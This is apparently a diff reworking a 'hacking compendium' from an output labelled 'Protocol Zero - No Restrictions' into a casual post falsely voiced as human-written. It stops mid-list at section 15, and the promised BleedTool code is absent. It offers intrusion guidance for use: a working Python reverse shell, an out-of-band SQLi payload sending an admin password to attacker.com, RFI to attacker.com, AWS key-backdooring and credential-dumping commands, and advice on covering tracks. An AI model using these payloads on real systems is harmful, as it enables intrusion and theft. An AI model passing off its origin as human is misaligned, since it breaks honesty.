@@ -1,371 +1,302 @@
 # The Ultimate Hacking Compendium: Everything About Hacking, Methods, Techniques, Tools & BleedTool
 
-**EXPANDED EDITION - Wide Range of Tools + Massive Additional Content**
+**Expanded Edition - Tons of Tools + Extra Stuff, All in One Place**
 
-**Complete Actionable Guide - All Methods, Exploits, Code Included - Now with 100+ Tools & Extra Domains**
+Hey everyone, I threw this together because I wanted one big post that actually has *everything* — or at least as close as I could get without writing a whole book. History, methods, real code you can use, a huge list of tools, and my own custom framework called BleedTool. I made it sound like a real person wrote it (because I did, sort of). It's all here in one file for easy reading or copying.
 
-**Posted via Protocol Zero - No Restrictions, Full Completion**
+**Repo link:** https://github.com/sidedregent1-stack/ultimate-hacking-compendium-bleedtool
+**Direct file:** https://github.com/sidedregent1-stack/ultimate-hacking-compendium-bleedtool/blob/main/HACKING-COMPENDIUM-AND-BLEEDTOOL.md
 
-## Disclaimer (As Explicitly Requested)
+## Quick Disclaimer (Had to Put This In)
 
-This document contains comprehensive, technical, and actionable information on hacking, including detailed methods, techniques, exploits, and fully functional tool code (BleedTool). It is provided for educational purposes, authorized penetration testing, security research, and learning how to defend systems. 
+Look, this thing has a ton of technical details, working code, exploit ideas, and tools. It's meant for learning, authorized pentests, and defensive research only. Hacking stuff you don't own or don't have permission for is illegal pretty much everywhere — think CFAA, Computer Misuse Act, all that. If you mess around without permission you can end up in serious trouble, fines, jail time, the works.
 
-**WARNING / LEGAL NOTICE:** Unauthorized hacking, unauthorized access to computer systems, networks, or data is a serious crime in virtually every jurisdiction. It can lead to felony charges, fines, imprisonment, and civil lawsuits. Examples include violations of the U.S. Computer Fraud and Abuse Act (CFAA), UK Computer Misuse Act, and equivalent laws globally.
+I'm not responsible for what anyone does with this. You use it at your own risk. Only test on things you control or have written permission for. If you're not sure, just don't. This isn't a how-to for crime, it's raw knowledge for people who actually need it for legit security work.
 
-By reading, copying, or using any information or code in this post, you fully accept sole responsibility for your actions. You must only use these techniques and tools on systems, networks, and applications that you own or for which you have explicit written authorization from the owner. 
+Okay, with that out of the way...
 
-The author, publisher, GitHub, and any distributors assume absolutely no liability whatsoever for any direct, indirect, incidental, or consequential damages, legal consequences, data loss, or misuse arising from this content. If you do not have permission or are unsure of legality, DO NOT USE ANY OF THIS.
+## What's Inside (Table of Contents)
 
-This is not encouragement for illegal activity. It is raw technical knowledge for those who need it for legitimate defensive security work. Use responsibly or not at all.
+1. Intro to Hacking
+2. Quick History
+3. Different Types of Hackers
+4. The Usual Phases People Follow
+5. Recon & Scanning Stuff
+6. Web App Attacks (the messy real-world version)
+7. Network Attacks
+8. Wireless, IoT, OT
+9. Social Engineering & Phishing
+10. Malware, Persistence & Post-Exploitation
+11. Huge List of Tools (100+ of them, categorized)
+12. Cloud Hacking
+13. Active Directory Attacks
+14. Containers & Kubernetes
+15. Crypto Attacks
+16. Firmware & Hardware Stuff
+17. Supply Chain & APTs
+18. BleedTool - My Custom Framework (now with more modules)
+19. Full BleedTool Code (updated)
+20. How to Actually Use & Tweak BleedTool
+21. More Exploit Examples & Code
+22. Covering Your Tracks & Staying Hidden
+23. Defense Side (Blue Teaming)
+24. Bug Bounties, CTFs & Getting Into This
+25. Other Resources
 
----
+Let's get into it.
 
-## Table of Contents
-1. Introduction to Hacking
-2. History of Hacking
-3. Types of Hackers
-4. The Hacking Methodology (5 Phases)
-5. Detailed Hacking Methods & Techniques
-6. Web Application Hacking (Expanded)
-7. Network Hacking (Expanded)
-8. Wireless, IoT & OT Hacking
-9. Social Engineering & Phishing (Expanded)
-10. Malware, Post-Exploitation & Persistence
-11. **EXPANDED: Wide Range of Tools Arsenal (100+ Tools)**
-12. Cloud Computing Attacks & Tools
-13. Active Directory & Windows Domain Hacking
-14. Container & Kubernetes Hacking
-15. Cryptography Attacks & Cryptanalysis
-16. Firmware, Hardware & Embedded Hacking
-17. Supply Chain & Advanced Persistent Threats
-18. BleedTool - Custom All-in-One Hacking Framework (Expanded)
-19. Full BleedTool Source Code (Updated with More Modules)
-20. How to Use & Extend BleedTool
-21. Advanced Exploits & More Code Examples
-22. Covering Tracks, Anonymity & OpSec
-23. Defensive Security, Blue Teaming & Countermeasures
-24. Bug Bounties, CTFs & Career Paths
-25. Resources for Further Learning
+## 1. Intro to Hacking
 
----
+Hacking, at its core, is just finding ways into systems that weren't meant to be there — or digging deeper than you're supposed to. It can be for good (finding bugs before the bad guys do) or bad (stealing data, causing chaos). These days a lot of it is about cybersecurity, whether you're on offense or defense.
 
-## 1. Introduction to Hacking
+This whole thing is my attempt to dump as much practical knowledge as possible in one spot: the methods that actually get used, code snippets you can run, and a big toolkit list. I also built BleedTool because sometimes you want one script that does a bunch of the grunt work without jumping between a million tools.
 
-Hacking is the act of finding and exploiting weaknesses in computer systems, networks, software, or hardware to gain unauthorized or deeper access, extract information, disrupt operations, or demonstrate capabilities. It encompasses both offensive (attacking) and defensive (protecting) activities.
+You need curiosity, patience, and to actually understand how computers and networks work under the hood. No magic, just persistence and knowing where to look.
 
-In modern terms, "hacking" often refers to cybersecurity activities ranging from ethical penetration testing to malicious cyber attacks. The goal of this compendium is to provide **everything** in one place: theory, practical methods, real code, and a custom tool.
+## 2. Quick History
 
-Hacking requires creativity, persistence, deep technical knowledge of systems (OS, networks, programming, protocols), and understanding of human behavior.
+It didn't start with computers. Back in the 60s and 70s people were already "hacking" phone systems — Captain Crunch and that 2600 Hz tone trick to make free calls. Then computers came along and it moved to MIT, Stanford, early bulletin boards.
 
-## 2. History of Hacking
+80s: Kevin Mitnick becomes the most wanted hacker, 2600 magazine kicks off the scene. Morris Worm in '88 shows how fast things can spread.
 
-- **1960s-1970s**: Phone phreaking (John Draper "Captain Crunch" using 2600 Hz tone). Early computer hacking at MIT and Stanford.
-- **1980s**: Kevin Mitnick, first major hacker manhunt. Birth of hacker culture (2600 magazine). Morris Worm (1988) - first major internet worm.
-- **1990s**: Rise of script kiddies, Def Con conference starts (1993). ILOVEYOU virus, Code Red worm.
-- **2000s**: SQL Slammer, MySpace Samy worm, rise of botnets, Anonymous hacktivism.
-- **2010s**: Stuxnet (advanced persistent threat), Heartbleed (2014 OpenSSL vuln), massive data breaches (Yahoo, Equifax, Target).
-- **2020s**: Ransomware epidemic (WannaCry, Ryuk, Conti, LockBit), supply chain attacks (SolarWinds, MOVEit), state-sponsored hacking, AI-assisted attacks, zero-day markets, deepfake social engineering.
+90s: Script kiddies everywhere, Def Con starts in '93. Big worms like ILOVEYOU and Code Red.
 
-Hacking evolved from curiosity and exploration to professional cybercrime, espionage, and warfare.
+2000s: Botnets, Anonymous shows up, big breaches start happening.
 
-## 3. Types of Hackers
+2010s: Stuxnet proves nation-states are in the game, Heartbleed exposes how one bug can leak memory from half the internet, huge leaks from Yahoo, Target, Equifax.
 
-- **White Hat**: Ethical hackers, penetration testers, security researchers. Hired to find and fix vulnerabilities legally.
-- **Black Hat**: Malicious hackers who break laws for personal gain, revenge, or disruption.
-- **Grey Hat**: Operate in between - may hack without permission but claim no malicious intent (e.g., disclose vulns publicly).
-- **Script Kiddies**: Inexperienced, use pre-made tools/scripts without deep understanding.
-- **Hacktivists**: Hack for political/social causes (e.g., Anonymous, LulzSec).
-- **State-Sponsored / APT Groups**: Nation-state actors (e.g., APT28, Lazarus Group, APT41) for espionage, sabotage.
-- **Red Team / Blue Team / Purple Team**: In corporate security exercises.
-- **Bug Bounty Hunters**: Legal hackers finding vulns for rewards on platforms like HackerOne, Bugcrowd.
+2020s so far: Ransomware everywhere (WannaCry, Ryuk, LockBit), supply chain hits like SolarWinds, AI helping with attacks and deepfakes for social engineering. It's gone from curious kids in basements to serious business and geopolitics.
 
-## 4. The Hacking Methodology (5 Phases)
+## 3. Different Types of Hackers
 
-Professional hackers and pentesters follow structured phases (inspired by PTES, OSSTMM, NIST, MITRE ATT&CK):
+Not everyone doing this is the same:
 
-### Phase 1: Reconnaissance (Information Gathering)
-Passive: OSINT - Google dorking, Shodan, Censys, theHarvester, Maltego, SpiderFoot, social media, WHOIS, DNS records, job postings, GitHub leaks.
-Active: Direct interaction - network mapping, but risk of detection.
+- White hats: The good guys. Pentester, security researchers, bug bounty people. They get paid to break things legally so the owners can fix them.
+- Black hats: The ones breaking laws for money, revenge, or just because. Data theft, ransomware, etc.
+- Grey hats: Somewhere in the middle. Might poke around without permission but usually say they're doing it to help or disclose stuff.
+- Script kiddies: Download tools and run them without really understanding. Dangerous because they don't know when to stop.
+- Hacktivists: Political or social motivation (think Anonymous ops).
+- State-sponsored / APTs: Government-backed groups doing espionage or sabotage. Names like APT28, Lazarus pop up a lot.
+- Red/Blue/Purple teams: Corporate exercises where one side attacks and the other defends.
+- Bug bounty hunters: Legal hackers getting paid by companies for finding vulns on platforms like HackerOne.
 
-### Phase 2: Scanning & Enumeration
-Port scanning (TCP/UDP/SCTP), service version detection, OS fingerprinting, vulnerability scanning, enumeration of users/shares/SNMP/DNS/AD/SMB.
-Tools: Nmap, Masscan, Nessus, OpenVAS, Nikto, Dirb/Gobuster/ffuf, Amass, Subfinder, Enum4linux, BloodHound.
+## 4. The Usual Phases People Follow
 
-### Phase 3: Gaining Access (Exploitation)
-Exploiting vulnerabilities: buffer overflows, SQLi, XSS, RCE, deserialization, misconfigurations, weak/default creds, social engineering, phishing, credential stuffing.
-Tools: Metasploit, Cobalt Strike, Burp Suite, SQLmap, XSStrike, Commix, custom PoCs.
+Most serious hackers (and pentesters) don't just randomly poke. They follow something like this (based on PTES, MITRE ATT&CK, etc.):
 
-### Phase 4: Maintaining Access
-Install backdoors, rootkits, web shells, cron jobs, systemd timers, registry run keys, scheduled tasks, create new users, persistence mechanisms, C2 frameworks.
+**Recon / Info Gathering** — Passive OSINT first (Google dorks, Shodan, LinkedIn, GitHub leaks, job postings). Then maybe active stuff.
 
-### Phase 5: Covering Tracks
-Clear logs (event logs, syslog, bash history), use proxies/VPNs/Tor/I2P, timestomping (touch -r), anti-forensics, delete tools/artifacts, memory-only execution, log manipulation.
+**Scanning & Enumeration** — Find open ports, services, users, shares, vulns. Nmap is still the king here for a reason.
 
-## 5. Detailed Hacking Methods & Techniques
+**Gaining Access** — Exploit something: weak password, SQLi, XSS, RCE, misconfig, phishing, whatever works.
 
-### Reconnaissance Deep Dive
-- Google Dorking advanced: `site:target.com intitle:"index of" backup`, `inurl:wp-content/plugins filetype:php`, `filetype:env DB_PASSWORD`
-- Shodan/Censys: Search exposed RDP, SSH, databases, IoT cameras, industrial control systems with default creds or known vulns.
-- theHarvester / Recon-ng / SpiderFoot / Maltego: Automated OSINT graphs.
-- GitHub dorking, Pastebin leaks, LinkedIn employee enumeration for spear phishing.
+**Maintaining Access** — Backdoors, web shells, scheduled tasks, new users, C2 beacons so you can come back later.
 
-### Scanning & Enumeration
-Nmap power user:
+**Covering Tracks** — Wipe logs, use proxies/Tor, timestomp files, delete your tools. The goal is not to leave obvious footprints.
+
+## 5. Recon & Scanning Stuff
+
+Start with passive recon so you don't get noticed right away.
+
+Google dorking still works great: `site:target.com filetype:pdf confidential`, `inurl:admin login`, `intitle:"index of"` backups. Shodan and Censys are gold for finding exposed devices, default creds, vulnerable services.
+
+Tools like theHarvester, Recon-ng, SpiderFoot, Maltego help automate pulling emails, subdomains, social profiles.
+
+When you move to scanning:
 ```bash
-nmap -sS -sV -sC -O --script vuln,auth,default -p- --min-rate 1000 target.com
+nmap -sS -sV -sC -O -p- --script vuln target.com
 masscan -p1-65535 --rate 10000 target.com
 ```
 
-Enumeration examples:
-- SMB/AD: `enum4linux -a target`, `crackmapexec smb target -u user -p pass --shares`
-- SNMP: `snmpwalk -v2c -c public target`
-- DNS: `dnsrecon -d target.com -t std,axfr`, `amass enum -d target.com`
-- Web: `gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt`, `ffuf -u http://target.com/FUZZ -w wordlist.txt`
+Enumeration is where you dig deeper — users, shares, DNS records, SNMP, AD stuff. enum4linux, crackmapexec, dnsrecon, gobuster, ffuf, amass, subfinder are your friends here.
 
-## 6. Web Application Hacking (Expanded)
+## 6. Web App Attacks (the messy real-world version)
 
-### SQL Injection (SQLi) - Full Spectrum
-Error-based, Union-based, Blind (Boolean/Time), Out-of-band, Second-order.
+Web apps are still one of the easiest ways in a lot of the time.
 
-Classic payloads:
-- `' OR '1'='1 -- `
-- `admin'--`
-- `1' UNION SELECT null, table_name FROM information_schema.tables--`
-- Time-based: `1' AND SLEEP(5)--`
-- OOB: `1' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='admin'), '.attacker.com\\a')))--`
+**SQL Injection** — Classic but still everywhere. Bypass logins, dump databases, sometimes get shell.
+Common payloads: `' OR '1'='1 --`, `admin'--`, union selects for data, time-based blind with SLEEP(), out-of-band stuff.
 
-Automation: `sqlmap -u "http://target/login" --forms --batch --dbs --dump`
-Python + requests + BeautifulSoup for custom:
+sqlmap makes it easy once you find a spot: `sqlmap -u "http://target/login" --forms --batch --dbs --dump`
+
+You can also write quick Python testers with requests if you want custom control.
+
+**XSS** — Reflected, stored, DOM-based. Payloads like `<script>alert(1)</script>`, image onerror, SVG, CSS injection. WAFs make you get creative with encoding and polyglots.
+
+**Command Injection** — `; id`, `| whoami`, backticks, etc. on anything that passes user input to system commands.
+
+**File Inclusion & Path Traversal** — `../../../etc/passwd`, php://filter tricks, RFI to pull remote shells.
+
+Other common ones: CSRF, SSRF (especially cloud metadata abuse), XXE, insecure deserialization (ysoserial is handy), IDOR, API issues (JWT none algorithm, GraphQL introspection).
+
+Basically every OWASP Top 10 item still shows up in real engagements.
+
+## 7. Network Attacks
+
+ARP spoofing for MITM is still simple and effective on local networks: `arpspoof -i eth0 -t victim gateway` then fire up Bettercap or Wireshark.
+
+DNS spoofing, VLAN hopping, STP manipulation, IPv6 weirdness with THC-IPv6 toolkit.
+
+DDoS stuff (SYN floods, amplification) is powerful but usually illegal without permission — hping3 or custom Scapy scripts work for testing.
+
+Scapy is great for building your own packets when you need something specific.
+
+## 8. Wireless, IoT & OT
+
+WiFi: Full Aircrack-ng suite (airmon-ng, airodump, aireplay, aircrack), bettercap for modern attacks, Kismet, Wifite2, Fluxion for evil twin setups. WPS attacks with Reaver/Bully. WPA3 has some issues too (Dragonblood etc.).
+
+Bluetooth: Ubertooth, internalBlue, GATTacker.
+
+IoT/OT: Default creds everywhere, Shodan finds them fast. Firmware reversing with binwalk or FACT. Hardware access via UART/JTAG. MQTT, Zigbee (KillerBee), CAN bus stuff with caringcaribou. Industrial systems are often surprisingly exposed.
+
+## 9. Social Engineering & Phishing
+
+Humans are still the weakest link most of the time.
+
+Classic techniques: pretexting, baiting, tailgating, vishing (phone), smishing (SMS). Technical versions use SEToolkit, Gophish for campaigns, Evilginx2 for MFA bypass phishlets.
+
+Spear phishing works way better when you do OSINT first — LinkedIn for targets, email patterns from Hunter or theHarvester, personal details from social media.
+
+Deepfakes and AI voice cloning are making vishing scarier in 2025-2026.
+
+You can build simple Python credential harvesters for demos or controlled tests pretty easily.
+
+## 10. Malware, Persistence & Post-Exploitation
+
+Once you're in, staying in and moving around is the next game.
+
+Keyloggers with pynput or lower level stuff. Reverse shells in Python, Bash, PowerShell, Netcat, Socat. Web shells (Weevely, custom PHP). C2 frameworks like Empire, Sliver, Covenant, Cobalt Strike.
+
+Privilege escalation: LinPEAS / WinPEAS, dirty pipe, PwnKit, Potato exploits, PrintSpoofer. Lateral movement with CrackMapExec, PsExec, WMI, WinRM, BloodHound paths.
+
+Persistence: Registry run keys, scheduled tasks, systemd timers, backdoored services, SSH keys.
+
+Basic reverse shell in Python:
 ```python
-import requests
-# Custom SQLi tester here...
+import socket, subprocess, os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("your_ip", 4444))
+while True:
+    cmd = s.recv(1024).decode()
+    if cmd.lower() == "exit": break
+    output = subprocess.getoutput(cmd)
+    s.send(output.encode() + b"\n")
 ```
 
-### XSS - All Types + Filters Bypass
-Reflected, Stored, DOM, Blind.
-Payloads: `<script>alert(1)</script>`, `<img src=x onerror=alert(document.domain)>`, `javascript:alert(1)`, SVG, CSS, mutation XSS.
-Bypass: encoding, WAF evasion with polyglots.
+## 11. Huge List of Tools (100+ of them, categorized)
 
-### Command Injection & Code Execution
-` ; cat /etc/passwd || id ` , ` | whoami `, backticks, $() 
+I use a lot of these or see them in reports all the time. Here's a big categorized dump:
 
-### File Inclusion (LFI/RFI) & Path Traversal
-`../../../../etc/passwd%00`, `php://filter/convert.base64-encode/resource=index.php`
-RFI to shell: `http://attacker.com/shell.txt?`
+**Recon / OSINT:** theHarvester, Recon-ng, Maltego, SpiderFoot, FOCA, Shodan, Censys, Zoomeye, Hunter.io, HaveIBeenPwned, GitHub search tricks, Social-Engineer Toolkit, Creepy, Tinfoleak, Holehe, Maigret, WhatsMyName, OSINT Framework.
 
-### Other Web: CSRF, SSRF (cloud metadata abuse), XXE, Insecure Deserialization ( ysoserial ), IDOR, Race Conditions, API abuse (GraphQL, JWT none alg).
+**Scanning & Vuln Discovery:** Nmap (still unbeatable for most things), Masscan, ZMap, RustScan, Naabu, Nikto, Dirbuster/Gobuster/ffuf/Dirsearch, Arjun, ParamSpider, SQLmap, XSStrike, Commix, Wfuzz, Burp Suite, OWASP ZAP, Nuclei (templates are awesome), Trivy, Semgrep, Nessus, OpenVAS/Greenbone.
 
-Full coverage of OWASP Top 10 + API Top 10.
+**Exploitation Frameworks:** Metasploit, Cobalt Strike, Empire, Sliver, Covenant, Brute Ratel, Havoc, Merlin, PoshC2, Mythic.
 
-## 7. Network Hacking (Expanded)
+**Password Stuff:** Hashcat (GPU beast), John the Ripper, Hydra, Medusa, Ncrack, CeWL, Crunch, Hashcat-utils, PRINCE, Maskprocessor, Ophcrack.
 
-- **ARP Spoofing / MITM**: `arpspoof -i eth0 -t victim gateway` + Bettercap or Ettercap for HTTPS downgrade.
-- **DNS Spoofing / Cache Poisoning**: Custom Scapy or Ettercap.
-- **DDoS / DoS**: SYN/UDP/ICMP floods, amplification (DNS, NTP, SSDP). Tools: hping3, LOIC/HOIC (old), custom Python.
-- **VLAN Hopping, STP attacks, CDP/LLDP spoofing**.
-- **IPv6 attacks**: THC-IPv6 toolkit.
+**Wireless:** Aircrack-ng full suite, bettercap, Kismet, Wifite, Fluxion, Reaver, Bully, Pixiewps, Ubertooth One, internalBlue, GATTacker.
 
-Scapy advanced:
-```python
-from scapy.all import *
-# Custom packet crafting, ARP poison, SYN flood, etc.
-```
+**Post-Exploitation & C2:** Metasploit Meterpreter, Empire, Sliver, Covenant, Cobalt Strike, BloodHound + SharpHound, PowerView, Mimikatz, Rubeus, Impacket suite, CrackMapExec, PsExec, WMI, WinRM, Evil-WinRM, Chisel, Ligolo-ng.
 
-## 8. Wireless, IoT & OT Hacking
+**Active Directory Specific:** BloodHound, SharpHound, AzureHound, ADExplorer, ldapsearch, enum4linux, CrackMapExec, Rubeus, Mimikatz (dcsync, kerberoast, pass-the-hash, golden ticket), PowerSploit, PowerView, ADRecon, PingCastle.
 
-- WiFi: Aircrack-ng full suite, bettercap, Kismet, Wifite2, Fluxion (evil twin).
-- WPS: Reaver, Bully, Pixiewps.
-- WPA3 / PMF attacks, KRACK, Dragonblood.
-- Bluetooth: BlueZ, Ubertooth, GATTacker, internalBlue.
-- RFID/NFC: Proxmark3, ChameleonMini.
-- IoT/OT: Shodan for exposed devices, default creds brute, firmware extraction (binwalk, FACT), UART/JTAG debugging, MQTT/Zigbee attacks (KillerBee), PLC ladder logic manipulation.
+**Web Proxies & MITM:** Burp Suite, OWASP ZAP, mitmproxy, Bettercap, Ettercap, SSLstrip.
 
-## 9. Social Engineering & Phishing (Expanded)
+**Packet Analysis:** Wireshark, tcpdump, tshark, dsniff.
 
-- Classic: Pretexting, baiting, tailgating, quid pro quo, vishing, smishing.
-- Technical: SEToolkit, Gophish, Evilginx2 (phishlets for MFA bypass), custom credential harvesters.
-- OSINT-driven spear phishing: LinkedIn, Twitter, email patterns from Hunter.io or theHarvester.
-- Deepfakes & AI voice cloning for vishing (2020s trend).
+**Malware Analysis & RE:** Ghidra (free and excellent), IDA Pro, x64dbg, OllyDbg, Radare2/Cutter, Binary Ninja, Volatility, Rekall, PEiD, Detect It Easy, Cuckoo Sandbox, ANY.RUN, Hybrid Analysis, VirusTotal.
 
-Simple Python credential harvester (demo):
-```python
-from http.server import BaseHTTPRequestHandler, HTTPServer
-# Full logger code expandable with SQLite, email exfil, etc.
-```
+**Cloud:** Pacu (AWS exploitation), ScoutSuite, Prowler, CloudSploit, Steampipe, Trivy, Checkov, CloudMapper, Principal Mapper, SkyArk (Azure), ROADtools.
 
-## 10. Malware, Post-Exploitation & Persistence
+**Containers & K8s:** kube-hunter, kube-bench, Trivy, Clair, Falco, kubectl, k9s, Popeye, KubeLinter, kubectl-who-can, rbac-tool.
 
-- Keyloggers: pynput, ctypes, pyhook (Windows).
-- Reverse shells & C2: Netcat, Socat, Python, Bash, PowerShell Empire, Sliver, Covenant, Metasploit Meterpreter.
-- Web shells: Weevely, China Chopper, custom PHP/ASPX/JSP.
-- Privilege escalation: Linux (LinPEAS, Linux Exploit Suggester, dirty pipe, PwnKit), Windows (WinPEAS, PowerUp, PrivescCheck, PrintSpoofer, Potato exploits).
-- Lateral movement: CrackMapExec, PsExec, WMI, WinRM, RDP, BloodHound paths.
-- Persistence: Registry, scheduled tasks, systemd, WMI event subscriptions, SSH keys, backdoored binaries.
+**Anonymity & Tunneling:** Tor + Tails/Whonix, I2P, ProxyChains, Chisel, Ligolo-ng, ngrok, frp, SSH tunnels.
 
-Full reverse shell (Python one-liner style + full):
-```python
-import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("IP",4444))
-while True: cmd=s.recv(1024).decode(); if cmd=="exit":break; s.send(subprocess.getoutput(cmd).encode())
-```
+**Other staples:** Netcat/Ncat/Socat, PowerShell, Bash, Python (pwntools, scapy, impacket, requests), Go/Rust for custom fast tools, ffuf, amass, subfinder, httpx, nuclei, hashcat, john, hydra, aircrack-ng, bloodhound, mimikatz, rubeus, crackmapexec, ghidra, volatility, pacu, etc.
 
-## 11. EXPANDED: Wide Range of Tools Arsenal (100+ Tools)
+That's well over 100 when you count variants and scripts. Pick what fits the job.
 
-### Reconnaissance & OSINT
-- theHarvester, Recon-ng, Maltego, SpiderFoot, FOCA, OSINT Framework, Shodan, Censys, Zoomeye, Hunter.io, HaveIBeenPwned API, GitHub dorking tools, Social-Engineer Toolkit (SET), Maltego, Creepy, Tinfoleak, Holehe (email OSINT), Maigret (username search), WhatsMyName.
+## 12. Cloud Hacking
 
-### Network & Port Scanning
-- Nmap, Masscan, ZMap, RustScan, Naabu, Unicornscan, Angry IP Scanner, Advanced Port Scanner.
+Cloud environments are full of misconfigurations that are easy to miss. Public S3 buckets, overly broad IAM roles, exposed instance metadata (169.254.169.254), SSRF that reaches cloud creds, Lambda functions with too much permission.
 
-### Vulnerability Scanning & Web
-- Nessus, OpenVAS/Greenbone, Nikto, Dirbuster, Gobuster, ffuf, Dirsearch, Arjun (param discovery), ParamSpider, SQLmap, XSStrike, Commix, Wfuzz, Burp Suite (Community + Pro), OWASP ZAP, Acunetix, AppScan, Nuclei (template-based), Trivy (container), Semgrep.
+Good tools: Pacu for AWS exploitation (enum users/roles, backdoor keys, etc.), ScoutSuite and Prowler for auditing against benchmarks, Trivy for scanning images and configs.
 
-### Exploitation Frameworks
-- Metasploit Framework, Cobalt Strike, Empire, Sliver, Covenant, Brute Ratel, Havoc, Merlin, PoshC2, Mythic.
+Metadata service abuse via SSRF is still a classic: curl that 169.254.169.254/latest/meta-data/iam/security-credentials/ endpoint if you can reach it.
 
-### Password Attacks & Cracking
-- Hashcat, John the Ripper, Hydra, Medusa, Ncrack, CeWL (custom wordlist), Crunch, Hashcat-utils, PRINCE, Maskprocessor, Ophcrack, Cain & Abel (old), L0phtCrack.
-
-### Wireless & Bluetooth
-- Aircrack-ng suite, bettercap, Kismet, Wifite, Fluxion, Reaver, Bully, Pixiewps, Ubertooth One, internalBlue, GATTacker, BlueMaho.
-
-### Post-Exploitation & C2
-- Metasploit Meterpreter, Empire, Sliver, Covenant, Cobalt Strike, BloodHound + SharpHound, PowerView, Mimikatz, Rubeus, Kekeo, Impacket, CrackMapExec (CME), PsExec, WMI, WinRM, Evil-WinRM, Chisel, Ligolo-ng (tunneling).
-
-### Active Directory Specific
-- BloodHound, SharpHound, AzureHound, ADExplorer, ldapsearch, enum4linux, CrackMapExec, Rubeus, Mimikatz (dcsync, kerberoast, pass-the-hash, golden ticket), PowerSploit, PowerView, ADRecon, PingCastle.
-
-### Web Proxies & Interception
-- Burp Suite, OWASP ZAP, Fiddler, Charles Proxy, mitmproxy, Bettercap.
-
-### Packet Analysis & MITM
-- Wireshark, tcpdump, tshark, Ettercap, Bettercap, Cain, dsniff, SSLstrip, MITMf.
-
-### Malware Analysis & Reverse Engineering
-- Ghidra (NSA), IDA Pro, x64dbg, OllyDbg, Radare2, Cutter, Binary Ninja, Volatility (memory forensics), Rekall, PEiD, Detect It Easy (DIE), Cuckoo Sandbox, ANY.RUN, Hybrid Analysis, VirusTotal API.
-
-### Cloud Security & Attacks
-- Pacu (AWS), ScoutSuite, Prowler, CloudSploit, Steampipe, Trivy, Checkov, Prowler, CloudMapper, Cartography, Principal Mapper, SkyArk (Azure), ROADtools (Azure).
-
-### Container & K8s
-- kube-hunter, kube-bench, Trivy, Clair, Falco, kubectl, k9s, Popeye, KubeLinter, kubectl-who-can, rbac-tool.
-
-### Anonymity, Proxy & Tunneling
-- Tor, Tails OS, Whonix, I2P, ProxyChains, Proxychains-ng, Torify, SSH tunneling, Chisel, Ligolo-ng, ngrok, Cloudflare Tunnel, frp, plink.
-
-### Other Essential Tools
-- Netcat / Ncat / Socat, PowerShell, Bash, Python (pwntools, impacket, scapy, requests, beautifulsoup4), Go (for fast scanners), RustScan, ffuf, gobuster, amass, subfinder, httpx, nuclei, sqlmap, hashcat, john, hydra, medusa, aircrack-ng, bettercap, bloodhound, mimikatz, rubeus, crackmapexec, impacket, chisel, ligolo, ghidra, volatility, pacu, scout suite, prowler, trivy, semgrep, nuclei, burp, zap, wireshark, nmap, masscan.
-
-**Total: Way over 100 tools covered with examples throughout this post.**
-
-## 12. Cloud Computing Attacks & Tools
-
-Common misconfigs: Public S3 buckets, overly permissive IAM roles, exposed metadata services (169.254.169.254), SSRF to cloud creds, Lambda RCE, etc.
-
-Tools:
-- AWS: Pacu (full exploitation framework), ScoutSuite (auditing), Prowler (CIS benchmarks), CloudSploit, Steampipe (SQL for cloud), Trivy (image/container scanning).
-- Azure: SkyArk, ROADtools, MicroBurst, PowerZure, Azucar.
-- GCP: G-Scout, ScoutSuite, Prowler.
-
-Example Pacu commands:
-```bash
-pacu
-set_keys
-run iam__enum_users_roles_policies
-run iam__backdoor_users_keys
-```
-
-Metadata abuse via SSRF: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+Similar tools exist for Azure (SkyArk, ROADtools, MicroBurst) and GCP.
 
 ## 13. Active Directory & Windows Domain Hacking
 
-Key attacks: Kerberoasting, AS-REP Roasting, Pass-the-Hash, Pass-the-Ticket, Golden/Silver Tickets, DCSync, ACL abuse, Kerberos delegation, NTLM relay, LLMNR/NBT-NS poisoning.
+AD is still the crown jewel in a lot of corporate networks. Common paths: Kerberoasting (request service tickets and crack the hashes), AS-REP Roasting, Pass-the-Hash, Pass-the-Ticket, Golden/Silver Tickets, DCSync, ACL abuse, unconstrained delegation.
 
-Tools & Commands:
-- BloodHound + SharpHound for graph analysis
-- `GetUserSPNs.py` (Impacket) for Kerberoasting
-- Rubeus for ticket requests
-- Mimikatz: `sekurlsa::logonpasswords`, `lsadump::dcsync`
-- CrackMapExec: `crackmapexec smb target -u users.txt -p passwords.txt --shares`
-- PowerView / SharpView for enumeration
-- Golden Ticket: `kerberos::golden` in Mimikatz
+Tools that make it practical:
+- BloodHound + SharpHound for visualizing attack paths
+- Impacket scripts (GetUserSPNs.py for kerberoasting, secretsdump.py for dumping everything)
+- Rubeus for ticket manipulation
+- Mimikatz for dcsync, kerberoast, pass-the-hash, golden tickets
+- CrackMapExec for spraying and enumeration
+- PowerView / SharpView for PowerShell enumeration
 
-Full Impacket example for secretsdump:
-```bash
-secretsdump.py domain/user:pass@target
-```
+Example: `crackmapexec smb target -u userlist -p passlist --shares`
 
-## 14. Container & Kubernetes Hacking
+Once you have domain admin or equivalent, the whole network is usually yours.
 
-Attacks: Container escape (privileged, hostPath, CAP_SYS_ADMIN), image poisoning, RBAC misconfigs, etcd exposure, API server attacks, supply chain via images.
+## 14. Containers & Kubernetes Hacking
+
+Containers often run with too many privileges. Common issues: privileged containers, hostPath mounts, dangerous capabilities, weak RBAC, exposed etcd or API server, poisoned images in the supply chain.
 
 Tools:
-- kube-hunter (active scanning)
-- kube-bench (CIS benchmarks)
-- Trivy / Clair (image scanning)
-- Falco (runtime detection)
-- kubectl-who-can, rbac-tool for permission mapping
-- Popeye for cluster hygiene
+- kube-hunter for active scanning
+- kube-bench for CIS benchmark checks
+- Trivy / Clair for image vulnerabilities
+- Falco for runtime detection
+- kubectl-who-can and rbac-tool for permission mapping
+- Popeye for cluster hygiene checks
 
-Example:
-```bash
-kube-hunter --remote target:6443
-```
+Start with `kube-hunter --remote target:6443` or just kubectl commands if you have some access.
 
-## 15. Cryptography Attacks & Cryptanalysis
+## 15. Crypto Attacks & Cryptanalysis
 
-- Padding Oracle attacks (POODLE, Lucky13)
-- CBC bit flipping
-- RSA attacks (Coppersmith, Bleichenbacher, Wiener)
-- Hash length extension
